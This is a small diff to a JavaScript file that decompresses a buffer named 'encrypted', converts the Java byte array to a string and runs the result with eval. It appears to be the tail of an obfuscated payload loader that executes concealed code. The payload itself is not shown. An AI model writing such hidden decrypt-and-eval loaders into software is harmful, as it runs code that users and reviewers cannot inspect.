@@ -58,4 +58,10 @@ for (let outcnt = 0; outcnt < payloadSize; outcnt++) {
 
 let image = gzip.decomp(encrypted)
 
-eval(image)
+// convert java ByteArray into JS string
+var simg = ""
+for (let b of image) {
+    simg += String.fromCharCode(b & 255)
+}
+
+eval(simg)
